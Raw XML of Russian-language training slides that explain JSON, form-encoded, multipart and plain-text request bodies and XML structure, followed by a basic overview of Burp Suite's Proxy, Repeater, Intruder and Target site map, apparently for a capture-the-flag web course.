            <a:ext cx="4191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8798AD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1608" y="3284190"/>
            <a:ext cx="4191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8798AD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0680" y="3284190"/>
            <a:ext cx="4191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8798AD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A1159-37F8-D5B3-4EC9-5D7056C67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D0DE83B5-DE2B-7226-7761-556067D938F0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JSON: </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" sz="3300" b="1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формат</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" sz="33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3300" b="1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обмена</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" sz="33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3300" b="1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данными</a:t>
            </a:r>
            <a:endParaRPr kumimoji="0" sz="3300" b="1" i="0" u="none" strike="noStrike" kern="1200" cap="none" spc="0" normalizeH="0" baseline="0" noProof="0" dirty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5EF9B86-2367-BFE8-BA76-5243AC9D9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16" name="v7-text-24">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{52D49C5D-0D5D-4C5F-263A-CBE7A2080A27}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6438900" y="2000250"/>
            <a:ext cx="506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endParaRPr kumimoji="0" sz="1950" b="1" i="0" u="none" strike="noStrike" kern="1200" cap="none" spc="0" normalizeH="0" baseline="0" noProof="0" dirty="0">
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:solidFill>
                <a:srgbClr val="C97070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  <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="v7-text-25">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E9A73DD3-F8D0-62C9-ACAA-28F1FA17452A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6438900" y="2800350"/>
            <a:ext cx="50673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endParaRPr kumimoji="0" sz="2025" b="0" i="0" u="none" strike="noStrike" kern="1200" cap="none" spc="0" normalizeH="0" baseline="0" noProof="0" dirty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  <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="v7-text-26">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{27784FE0-5E45-C0E5-9D67-0DA97775A61F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6438900" y="5114925"/>
            <a:ext cx="506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endParaRPr kumimoji="0" sz="1725" b="0" i="0" u="none" strike="noStrike" kern="1200" cap="none" spc="0" normalizeH="0" baseline="0" noProof="0" dirty="0">
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:solidFill>
                <a:srgbClr val="A9B7C6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7CF4F8-D12B-A01B-8921-2CC42C0CD78F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="787079" y="2129741"/>
            <a:ext cx="1026192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</a:rPr>
              <a:t>JSON (JavaScript Object </a:t>
            </a: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</a:rPr>
              <a:t>Notation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</a:rPr>
              <a:t>)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</a:rPr>
              <a:t> — это компактный текстовый формат обмена данными, который представляет информацию в виде легко читаемых пар «ключ-значение» и упорядоченных списков, оставаясь независимым от языков программирования.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3031487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>
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DA69B525-1A7D-44A1-B865-90391FC0B751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JSON: формат и типы значений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6770BDD-15EB-4DB1-8EA1-00630827E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19" name="v7-box-42">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8163A121-A32E-4F51-B07A-AFA207308186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5048250" cy="3419475"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="10161E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0" name="v7-text-43">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{BEA92FF2-975D-48BC-AC3B-3D2309EEA7D2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="895350" y="2266950"/>
            <a:ext cx="462915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"user_id": </a:t>
            </a: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17</a:t>
            </a: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,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"nickname": </a:t>
            </a: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"alex"</a:t>
            </a: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,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"active": </a:t>
            </a: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true</a:t>
            </a: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,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"tags": [</a:t>
            </a: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"web"</a:t>
            </a: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],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"prefs": {"lang": </a:t>
            </a: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"ru"</a:t>
            </a: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},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"bio": </a:t>
            </a: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null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}</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="21" name="Таблица 20">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{59F6616E-D714-4FB0-BEDD-DB465D762454}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGraphicFramePr/>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="6134100" y="2057400"/>
          <a:ext cx="5372100" cy="3419472"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr firstRow="1"/>
              <a:tblGrid>
                <a:gridCol w="203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84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Поле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JSON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Python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4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user_id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number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4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nickname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string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4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active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boolean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bool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4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tags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array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list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4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prefs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object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dict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4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bio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null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None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27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EE3DE9CD-1AF6-46A9-8900-622410DE1DEF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Форма: x-www-form-urlencoded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C00677-A305-4B7D-9A85-CAE41E3D4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4" name="v7-box-506">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{EEB80CD5-2D2E-41C3-81D2-81A523E30FCD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7010400" cy="3429000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="10161E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5" name="v7-text-507">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1FBBA74F-2730-4DFF-B1B1-CC44044125DD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="895350" y="2247900"/>
            <a:ext cx="6591300" cy="3067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Content-Type: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application/x-www-form-urlencoded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user_id=17&amp;nickname=alex</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="v7-text-508">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{73717BEF-AA35-495D-A8E4-19298FE7AAD2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3409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После разбора формы</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="v7-text-509">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{EDF11A43-1708-4F82-9F6C-E1FBFEF29EB2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8096250" y="2762250"/>
            <a:ext cx="34099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{"user_id": </a:t>
            </a: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"17"</a:t>
            </a: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,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"nickname": </a:t>
            </a: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"alex"</a:t>
            </a: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v7-text-510">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2DF42B23-AE1D-4F44-A38C-CE767BA036E2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8096250" y="4000500"/>
            <a:ext cx="34099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Оба значения — строки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75" b="0" i="0" u="none" strike="noStrike" kern="1200" cap="none" spc="0" normalizeH="0" baseline="0" noProof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Для целого числа нужна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проверка и преобразование.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="888302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50926939-6D49-4B9F-BDA4-F80581A7FBB1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Загрузка файла: multipart/form-data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6179A20-05BE-4D9C-A0D0-036B91EFE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4" name="v7-box-512">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{619004ED-FA95-43C4-8D67-8DB92E8D4869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7010400" cy="3429000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="10161E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5" name="v7-text-513">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B5C4EF5F-CBA4-4120-BD02-B76A339BD97E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="895350" y="2247900"/>
            <a:ext cx="6591300" cy="3067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--demo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Content-Disposition:</a:t>
            </a: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form-data; name="title"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75" b="0" i="0" u="none" strike="noStrike" kern="1200" cap="none" spc="0" normalizeH="0" baseline="0" noProof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report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--demo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Content-Disposition:</a:t>
            </a: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form-data;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name="file"; filename="report.pdf"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Content-Type:</a:t>
            </a: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application/pdf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75" b="0" i="0" u="none" strike="noStrike" kern="1200" cap="none" spc="0" normalizeH="0" baseline="0" noProof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&lt;байты файла&gt;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--demo--</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="v7-text-514">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B2E143D3-A52B-4229-9B33-B3241B75F530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3409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Две</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" sz="195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части</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" sz="195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запроса</a:t>
            </a:r>
            <a:endParaRPr kumimoji="0" sz="1950" b="1" i="0" u="none" strike="noStrike" kern="1200" cap="none" spc="0" normalizeH="0" baseline="0" noProof="0" dirty="0">
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:solidFill>
                <a:srgbClr val="C97070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v7-text-515">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{000BCBBA-A69D-4B63-9100-85D0B9361322}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8096250" y="2762250"/>
            <a:ext cx="3409950" cy="2800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title: </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" sz="18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строка</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" sz="18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"report"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75" b="0" i="0" u="none" strike="noStrike" kern="1200" cap="none" spc="0" normalizeH="0" baseline="0" noProof="0" dirty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file: </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" sz="18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загруженный</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" sz="18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8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файл</a:t>
            </a:r>
            <a:endParaRPr kumimoji="0" sz="1875" b="0" i="0" u="none" strike="noStrike" kern="1200" cap="none" spc="0" normalizeH="0" baseline="0" noProof="0" dirty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Имя</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" sz="18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: report.pdf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Тело: </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" sz="18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байты</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" sz="18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8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файла</a:t>
            </a:r>
            <a:endParaRPr kumimoji="0" sz="1875" b="0" i="0" u="none" strike="noStrike" kern="1200" cap="none" spc="0" normalizeH="0" baseline="0" noProof="0" dirty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75" b="0" i="0" u="none" strike="noStrike" kern="1200" cap="none" spc="0" normalizeH="0" baseline="0" noProof="0" dirty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Имя</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" sz="18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и </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" sz="18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тип</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" sz="18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8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задаёт</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" sz="18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8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клиент</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" sz="18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714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C8976F68-D4D6-4796-B238-2FC836C93391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Текст: Content-Type text/plain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C43624-1A2D-4717-A1AE-B15324F52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4" name="v7-text-517">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{394C3635-5447-4832-BEA9-D4956A113B27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506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endParaRPr kumimoji="0" sz="1950" b="1" i="0" u="none" strike="noStrike" kern="1200" cap="none" spc="0" normalizeH="0" baseline="0" noProof="0" dirty="0">
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:solidFill>
                <a:srgbClr val="C97070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v7-text-518">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F875DE76-2C3C-4A5F-AF8F-076661A37C1F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50673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725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Content-Type:</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" sz="1725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text/plain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25" b="0" i="0" u="none" strike="noStrike" kern="1200" cap="none" spc="0" normalizeH="0" baseline="0" noProof="0" dirty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72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report.pdf</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="v7-text-519">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B36366A9-2323-474C-ACBD-570C38E23007}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="5114925"/>
            <a:ext cx="506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После чтения: строка "report.pdf"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9316A0F-B574-EF74-1508-16196CDBD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0" y="2324100"/>
            <a:ext cx="7010400" cy="3429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65694E0-B8FB-F7ED-68B9-164C064B309A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="2771775"/>
            <a:ext cx="61061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/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>Content-Type: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/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>text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/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>/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/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>plain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Apto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Apto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/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>report.pdf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BE049D-53E1-4292-A4F5-0A35B4593B1C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8131652" y="3475300"/>
            <a:ext cx="4312920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5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/>
              </a:rPr>
              <a:t>Строка "report.pdf«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50" b="0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Apto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5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/>
              </a:rPr>
              <a:t>Сырой текст без структуры.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50" b="0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Apto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5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/>
              </a:rPr>
              <a:t> Нет ключей и полей.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F6A381-E9C7-C0E1-0BF7-900701BCB11F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8131652" y="2887191"/>
            <a:ext cx="1802096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95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Aptos"/>
              </a:rPr>
              <a:t>После чтения</a:t>
            </a:r>
            <a:endParaRPr kumimoji="0" lang="ru-RU" sz="1950" b="0" i="0" u="none" strike="noStrike" kern="1200" cap="none" spc="0" normalizeH="0" baseline="0" noProof="0" dirty="0">
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:solidFill>
                <a:srgbClr val="C97070"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uLnTx/>
              <a:uFillTx/>
              <a:latin typeface="Apto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9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92892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XML: дерево данных</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="3" name="FlagIco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969" y="622935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" y="1755648"/>
            <a:ext cx="10817352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XML (eXtensible Markup Language)</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" sz="2500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— это расширяемый текстовый язык разметки, который хранит и передаёт структурированные данные в виде </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" sz="2500" b="1" i="0" u="none" strike="noStrike" kern="1200" cap="none" spc="0" normalizeH="0" baseline="0" noProof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дерева вложенных тегов</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" sz="2500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и атрибутов.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581009"/>
            <a:ext cx="10820369" cy="9239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XML: теги, атрибуты и структура</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="3" name="FlagIco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969" y="622935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" y="2057400"/>
            <a:ext cx="5047488" cy="3520440"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="10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86968" y="2258568"/>
            <a:ext cx="4645151" cy="31181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&lt;?xml version="1.0" encoding="UTF-8"?&gt;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&lt;!--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Профиль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пользователя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--&gt;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user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id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"17"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active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"true"</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="ru-RU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nickname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alex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&lt;/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nickname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tags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tag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web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&lt;/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tag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&lt;/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tags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prefs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lang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"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ru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"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/&gt;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bio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/&gt;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&lt;/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user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2057400"/>
          <a:ext cx="5376672" cy="4040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1">
                          <a:solidFill>
                            <a:srgbClr val="C97070"/>
                          </a:solidFill>
                          <a:latin typeface="DejaVu Sans"/>
                        </a:rPr>
                        <a:t>Конструкция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1">
                          <a:solidFill>
                            <a:srgbClr val="C97070"/>
                          </a:solidFill>
                          <a:latin typeface="DejaVu Sans"/>
                        </a:rPr>
                        <a:t>Элемент XML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1">
                          <a:solidFill>
                            <a:srgbClr val="C97070"/>
                          </a:solidFill>
                          <a:latin typeface="DejaVu Sans"/>
                        </a:rPr>
                        <a:t>Назначение в документе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375" b="0">
                          <a:solidFill>
                            <a:srgbClr val="EEF2F6"/>
                          </a:solidFill>
                          <a:latin typeface="Consolas"/>
                        </a:rPr>
                        <a:t>&lt;?xml ... ?&gt;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0">
                          <a:solidFill>
                            <a:srgbClr val="EEF2F6"/>
                          </a:solidFill>
                          <a:latin typeface="DejaVu Sans"/>
                        </a:rPr>
                        <a:t>Пролог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0">
                          <a:solidFill>
                            <a:srgbClr val="EEF2F6"/>
                          </a:solidFill>
                          <a:latin typeface="DejaVu Sans"/>
                        </a:rPr>
                        <a:t>Версия стандарта и кодировка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375" b="0">
                          <a:solidFill>
                            <a:srgbClr val="EEF2F6"/>
                          </a:solidFill>
                          <a:latin typeface="Consolas"/>
                        </a:rPr>
                        <a:t>&lt;user&gt;...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0">
                          <a:solidFill>
                            <a:srgbClr val="EEF2F6"/>
                          </a:solidFill>
                          <a:latin typeface="DejaVu Sans"/>
                        </a:rPr>
                        <a:t>Корневой тег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0">
                          <a:solidFill>
                            <a:srgbClr val="EEF2F6"/>
                          </a:solidFill>
                          <a:latin typeface="DejaVu Sans"/>
                        </a:rPr>
                        <a:t>Главный контейнер всего дерева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375" b="0">
                          <a:solidFill>
                            <a:srgbClr val="EEF2F6"/>
                          </a:solidFill>
                          <a:latin typeface="Consolas"/>
                        </a:rPr>
                        <a:t>id="17"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0">
                          <a:solidFill>
                            <a:srgbClr val="EEF2F6"/>
                          </a:solidFill>
                          <a:latin typeface="DejaVu Sans"/>
                        </a:rPr>
                        <a:t>Атрибут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0">
                          <a:solidFill>
                            <a:srgbClr val="EEF2F6"/>
                          </a:solidFill>
                          <a:latin typeface="DejaVu Sans"/>
                        </a:rPr>
                        <a:t>Пара «ключ=значение» у тега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375" b="0">
                          <a:solidFill>
                            <a:srgbClr val="EEF2F6"/>
                          </a:solidFill>
                          <a:latin typeface="Consolas"/>
                        </a:rPr>
                        <a:t>&lt;nickname&gt;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0">
                          <a:solidFill>
                            <a:srgbClr val="EEF2F6"/>
                          </a:solidFill>
                          <a:latin typeface="DejaVu Sans"/>
                        </a:rPr>
                        <a:t>Дочерний тег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0">
                          <a:solidFill>
                            <a:srgbClr val="EEF2F6"/>
                          </a:solidFill>
                          <a:latin typeface="DejaVu Sans"/>
                        </a:rPr>
                        <a:t>Вложенное поле с текстом alex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375" b="0">
                          <a:solidFill>
                            <a:srgbClr val="EEF2F6"/>
                          </a:solidFill>
                          <a:latin typeface="Consolas"/>
                        </a:rPr>
                        <a:t>&lt;tags&gt;&lt;tag&gt;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0">
                          <a:solidFill>
                            <a:srgbClr val="EEF2F6"/>
                          </a:solidFill>
                          <a:latin typeface="DejaVu Sans"/>
                        </a:rPr>
                        <a:t>Список тегов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0">
                          <a:solidFill>
                            <a:srgbClr val="EEF2F6"/>
                          </a:solidFill>
                          <a:latin typeface="DejaVu Sans"/>
                        </a:rPr>
                        <a:t>Повторяющиеся элементы (массив)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375" b="0">
                          <a:solidFill>
                            <a:srgbClr val="EEF2F6"/>
                          </a:solidFill>
                          <a:latin typeface="Consolas"/>
                        </a:rPr>
                        <a:t>&lt;bio/&gt;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0">
                          <a:solidFill>
                            <a:srgbClr val="EEF2F6"/>
                          </a:solidFill>
                          <a:latin typeface="DejaVu Sans"/>
                        </a:rPr>
                        <a:t>Пустой тег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0">
                          <a:solidFill>
                            <a:srgbClr val="EEF2F6"/>
                          </a:solidFill>
                          <a:latin typeface="DejaVu Sans"/>
                        </a:rPr>
                        <a:t>Самозакрывающийся тег без текста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Burp Suite: перехват и повтор запросов</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="3" name="FlagIco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969" y="622935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" y="1691640"/>
            <a:ext cx="5047488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50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Перехватывающий прокси (</a:t>
            </a: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127.0.0.1:8080</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" sz="1650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) между браузером и сервером:</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="BurpTabsImage" descr="Снимок экрана 2026-10-17 1812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87168"/>
            <a:ext cx="5047488" cy="7498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3529584"/>
            <a:ext cx="5047488" cy="2231136"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="10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3712463"/>
            <a:ext cx="4681727" cy="18653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1" i="0" u="none" strike="noStrike" kern="1200" cap="none" spc="0" normalizeH="0" baseline="0" noProof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Базовый сценарий работы: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1. Открыть цель во встроенном браузере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2. Найти запрос в Proxy → HTTP history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3. ПКМ → Send to Repeater (Ctrl + R)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4. Изменить запрос и нажать Send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35624" y="1691640"/>
          <a:ext cx="5376672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381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1">
                          <a:solidFill>
                            <a:srgbClr val="C97070"/>
                          </a:solidFill>
                          <a:latin typeface="DejaVu Sans"/>
                        </a:rPr>
                        <a:t>Раздел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1">
                          <a:solidFill>
                            <a:srgbClr val="C97070"/>
                          </a:solidFill>
                          <a:latin typeface="DejaVu Sans"/>
                        </a:rPr>
                        <a:t>Назначение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1">
                          <a:solidFill>
                            <a:srgbClr val="C97070"/>
                          </a:solidFill>
                          <a:latin typeface="DejaVu Sans"/>
                        </a:rPr>
                        <a:t>Ключевые возможности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375" b="0">
                          <a:solidFill>
                            <a:srgbClr val="EEF2F6"/>
                          </a:solidFill>
                          <a:latin typeface="Consolas"/>
                        </a:rPr>
                        <a:t>Target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0">
                          <a:solidFill>
                            <a:srgbClr val="EEF2F6"/>
                          </a:solidFill>
                          <a:latin typeface="DejaVu Sans"/>
                        </a:rPr>
                        <a:t>Карта и границы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0">
                          <a:solidFill>
                            <a:srgbClr val="EEF2F6"/>
                          </a:solidFill>
                          <a:latin typeface="DejaVu Sans"/>
                        </a:rPr>
                        <a:t>Site map (дерево путей) и настройка Scope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375" b="0">
                          <a:solidFill>
                            <a:srgbClr val="EEF2F6"/>
                          </a:solidFill>
                          <a:latin typeface="Consolas"/>
                        </a:rPr>
                        <a:t>Proxy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0">
                          <a:solidFill>
                            <a:srgbClr val="EEF2F6"/>
                          </a:solidFill>
                          <a:latin typeface="DejaVu Sans"/>
                        </a:rPr>
                        <a:t>Перехват и лог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0">
                          <a:solidFill>
                            <a:srgbClr val="EEF2F6"/>
                          </a:solidFill>
                          <a:latin typeface="DejaVu Sans"/>
                        </a:rPr>
                        <a:t>Intercept (пауза) и журнал HTTP history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375" b="0">
                          <a:solidFill>
                            <a:srgbClr val="EEF2F6"/>
                          </a:solidFill>
                          <a:latin typeface="Consolas"/>
                        </a:rPr>
                        <a:t>Repeater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0">
                          <a:solidFill>
                            <a:srgbClr val="EEF2F6"/>
                          </a:solidFill>
                          <a:latin typeface="DejaVu Sans"/>
                        </a:rPr>
                        <a:t>Ручная правка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0">
                          <a:solidFill>
                            <a:srgbClr val="EEF2F6"/>
                          </a:solidFill>
                          <a:latin typeface="DejaVu Sans"/>
                        </a:rPr>
                        <a:t>Модификация и повторная отправка (Ctrl+R)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375" b="0">
                          <a:solidFill>
                            <a:srgbClr val="EEF2F6"/>
                          </a:solidFill>
                          <a:latin typeface="Consolas"/>
                        </a:rPr>
                        <a:t>Intruder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0">
                          <a:solidFill>
                            <a:srgbClr val="EEF2F6"/>
                          </a:solidFill>
                          <a:latin typeface="DejaVu Sans"/>
                        </a:rPr>
                        <a:t>Автоперебор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sz="1450" b="0">
                          <a:solidFill>
                            <a:srgbClr val="EEF2F6"/>
                          </a:solidFill>
                          <a:latin typeface="DejaVu Sans"/>
                        </a:rPr>
                        <a:t>Подстановка словарей в позиции §...§ (Ctrl+I)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581009"/>
            <a:ext cx="10820369" cy="9239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Burp Suite: раздел Target</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="3" name="FlagIco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969" y="6229350"/>
            <a:ext cx="457200" cy="457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2258568"/>
            <a:ext cx="3200400" cy="1353312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405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50392" y="2386584"/>
            <a:ext cx="2871216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Site map (Карта сайта)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2715768"/>
            <a:ext cx="2871216" cy="7863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Строит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дерево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хостов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и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найденных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путей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(/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give_me_my_flag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)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при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обходе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950012"/>
            <a:ext cx="3200400" cy="1353312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405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50392" y="4078027"/>
            <a:ext cx="2871216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Обзор запросов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" y="4407212"/>
            <a:ext cx="2871216" cy="7863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При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выборе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любого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маршрута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внизу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сразу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видны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его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Request и Response.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
